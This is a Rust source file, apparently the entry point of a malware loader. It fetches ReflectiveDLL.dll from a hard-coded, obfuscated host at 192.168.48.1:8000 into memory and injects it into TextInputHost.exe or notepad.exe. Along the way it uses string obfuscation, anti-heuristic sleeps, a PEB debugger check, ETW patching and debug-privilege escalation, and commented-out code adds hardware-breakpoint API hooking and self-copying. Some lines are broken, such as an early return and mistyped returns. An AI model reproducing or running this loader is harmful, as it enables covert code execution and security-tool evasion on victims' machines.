// #![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]
#![allow(unused)]
#![allow(unreachable_code)]
#![allow(unused_unsafe)]


mod download;
mod parse_pe;
mod inject;
mod hwbp;
mod file;
mod nt_api;
mod debug_helper;
mod evasion;
mod reconnaissance;
use crate::debug_helper::*;

use obfuse::obfuse;
use clap::Parser;

use std::thread;
use std::time::Duration;


/// Inject ReflectiveDLL.dll into a target process.
#[derive(Parser, Debug)]
#[command(author, version, about, long_about = None)]
struct Args {

    /// Target process name (e.g., notepad.exe)
    #[arg(short, long)]
    process: String,

    // #[arg(short, long, conflicts_with = "url")]
    // file: Option<String>,

    // #[arg(short, long, conflicts_with = "file")]

    /// URL to download the DLL from (e.g., http://example.com/xxx.dll)
    #[arg(short, long)]
    url: Option<String>,

    /// yolo function name in xxx.dll
    #[arg(long, default_value = "yolo")]
    rflname: String
}


fn main() -> Result<(), anyhow::Error>{
    // let args = Args::parse();

    // let Some(url) = args.url else {
    //     eprintln!("[ERROR] --url must be provided.");
    //     std::process::exit(1);
    // };

    #[cfg(not(debug_assertions))]
    {
        for _i in 1..=3 {

            // Interleaving other behaviors to deceive heuristic scanning

            thread::sleep(Duration::from_secs(1));
        }

        let obfused_ip = obfuse!("192.168.48.1");
        let ip = obfused_ip.as_str();
        let common_ports = [80, 8000];


        let online = common_ports.iter().any(|&port| {
            reconnaissance::check_host_online(ip, port).is_ok()
        });
        
        if !online {
            return OK(());
        }
    }

    #[cfg(not(debug_assertions))]
    unsafe {

        if evasion::being_debugged_by_peb() {
            return;
        } 
        let _ = evasion::patch_etw().expect("[ERROR] Failed to patch E T W.");

    }

    nt_api::init_zw_api().expect("[ERROR] Failed to initialize ZW API!");

    let enabled_debug_privilege = match reconnaissance::enable_debug_privilege() {
        Ok(_) => {
            debug_println!("[INFO] Enabled Debug Priv");
            true
        }
        Err(e) => {
            debug_eprintln!("[WARNING] Enable Debug Priv failed\n{:#}", e);
            false
        }
    };


    let obfused_url = obfuse!("http://192.168.48.1:8000/ReflectiveDLL.dll");
    let url = obfused_url.as_str();


    let obfused_process = if enabled_debug_privilege {
        obfuse!("TextInputHost.exe")
    }
    else {
        obfuse!("notepad.exe")
    };


    // let obfused_process = obfuse!("typora.exe");
    let process = obfused_process.as_str();

    let obfused_rflname = obfuse!("yolo");
    let rflname = obfused_rflname.as_str();

    // for _i in 1..=10 {
    //     thread::sleep(Duration::from_secs(1));
    // }

    debug_println!("[INFO] Downloading from {}", url);

    let data = download::download_to_memory(url, None, None)
        .expect("Failed to download file");

    if !data.is_empty() {
        debug_println!("[INFO] Downloaded {} bytes", data.len());
    } else {
        debug_println!("[INFO] Downloaded empty file");
        return Ok(());
    }

    return Ok(());

    // let dll = pe_parser::new(data);
    let dll = parse_pe::PeFileParser::new(&data);

    let func_raw = dll.get_func_raw(rflname).expect("[ERROR] Failed to find yolo function");
    debug_println!("[INFO] yolo raw offset: 0x{:X}", func_raw);

    // let dr0 = hwbp::DR::Dr0;
    // let dr1 = hwbp::DR::Dr1;
    // let dr2 = hwbp::DR::Dr2;
    // let dr3 = hwbp::DR::Dr3;

    // unsafe {
    //     let _ = hwbp::hwbp_init().expect("[ERROR] hwbp_init failed!");

    //     let obfused_zwopenprocess = obfuse!("ZwOpenProcess\0");
    //     let obfused_zwallocatevirtualmemory = obfuse!("ZwAllocateVirtualMemory\0");
    //     let obfused_zwritevirtualmemory = obfuse!("ZwWriteVirtualMemory\0");
    //     let obfused_zwcreatethreadex = obfuse!("ZwCreateThreadEx\0");

    //     let obfused_str_zwopenprocess = obfused_zwopenprocess.as_str();
    //     let obfused_str_zwallocatevirtualmemory = obfused_zwallocatevirtualmemory.as_str();
    //     let obfused_str_zwritevirtualmemory = obfused_zwritevirtualmemory.as_str();
    //     let obfused_str_zwcreatethreadex = obfused_zwcreatethreadex.as_str();

    //     let _ = hwbp::set_hwbp(&dr0, obfused_str_zwopenprocess).expect("[ERROR] dr0");
    //     let _ = hwbp::set_hwbp(&dr1, obfused_str_zwallocatevirtualmemory).expect("[ERROR] dr1");
    //     let _ = hwbp::set_hwbp(&dr2, obfused_str_zwritevirtualmemory).expect("[ERROR] dr2");
    //     let _ = hwbp::set_hwbp(&dr3, obfused_str_zwcreatethreadex).expect("[ERROR] dr3");

    // }


    inject::inject_dll_into_process(
        &process.encode_utf16().collect::<Vec<u16>>(),
        &dll,
        func_raw,
    ).expect("Failed to 1nject DLL!\n");

    // file::self_copying().expect("[ERROR] self copying failed!");

    // unsafe {
    //     let _ = hwbp::unset_hwbp(&dr0);
    //     let _ = hwbp::unset_hwbp(&dr1);
    //     let _ = hwbp::unset_hwbp(&dr2);
    //     let _ = hwbp::unset_hwbp(&dr3);
    //     let _ = hwbp::hwbp_cleanup().expect("[ERROR] hwbp cleanup failed!");
    // }

    
    Ok(())

}
